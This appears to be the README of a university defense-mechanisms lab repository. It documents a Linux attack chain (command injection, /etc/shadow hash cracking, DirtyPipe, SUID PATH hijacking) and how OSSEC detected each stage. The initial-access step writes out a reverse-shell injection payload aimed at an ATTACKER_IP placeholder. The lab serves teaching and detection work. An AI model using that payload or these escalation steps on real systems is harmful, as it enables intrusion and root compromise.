# Linux Privilege Escalation Lab — Detected via OSSEC

**Course:** FC382 – Defense Mechanisms, University of Prince Mugrin
**Supervisor:** Dr. Abdulhakim Sabur · **Lab Instructor:** Mr. Mohammed Basuliman

⚠️ **Educational lab only.** Everything here was built and run in an isolated Kali ↔ Ubuntu 20.04
VM pair for a university coursework assignment on offense/defense mechanics. It is intentionally
vulnerable code — do not deploy it, or run it against any system you don't own.

## Overview

This lab walks through a full attack chain, from gaining a low-privilege foothold on a Linux
box to escalating to root, while OSSEC (host intrusion detection) is running to see which
steps get flagged and which don't.

## Attack Chain

1. **Initial access** — a deliberately vulnerable PHP "ping a host" page passes user input
   straight to `shell_exec()`. Injecting `; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1` opens
   a reverse shell to a Netcat listener.
2. **Credential dumping** — a separate misconfiguration allows reading `/etc/shadow` as a
   normal user; hashes are cracked offline with John the Ripper.
3. **Privilege escalation, path A: DirtyPipe** — the kernel exploit is compiled and run
   directly from `/tmp` on the victim to escalate to root.
4. **Privilege escalation, path B: SUID misconfiguration** — a backup script is planted on the
   `$PATH` ahead of a misconfigured SUID binary that calls it without an absolute path, so the
   SUID binary ends up executing attacker-controlled code as root.
5. **Detection** — OSSEC is configured to watch for exactly these behaviors and generates
   alerts for each stage of the attack.

## Tools Used

| Tool | Role |
|---|---|
| Kali Linux | Attacker machine |
| Ubuntu 20.04 | Victim machine |
| Netcat | Reverse shell listener |
| DirtyPipe exploit | Kernel exploit → root |
| John the Ripper | Password hash cracking |
| OSSEC | Detection of every attack stage |

## What's in this repo

- [`vulnerable-app/ping.php`](vulnerable-app/ping.php) — the intentionally vulnerable
  command-injection demo page used for initial access
- [`exploit/suid_privesc.sh`](exploit/suid_privesc.sh) — the SUID-misconfiguration exploit
  (drops a malicious `backup` script ahead of the vulnerable binary on `$PATH`)
- [`config/ossec.conf`](config/ossec.conf) — the OSSEC ruleset configuration used to detect
  the attack chain above

## Results

OSSEC alerted on every stage tested: the initial command injection, the DirtyPipe exploit
execution, the SUID binary abuse, and the `/etc/shadow` read. Screenshots of each alert are
in the original lab report (available on request).

## Evaluation

**Strengths:** clear demonstration that host-based IDS can catch privilege-escalation
techniques that network-only monitoring would miss.

**Limitations:** detection-only setup — no automated blocking/response was configured, so
OSSEC's alerts still require a human to act on them.

## Author

Hisham Bai (group coursework, FC382 — Defense Mechanisms)
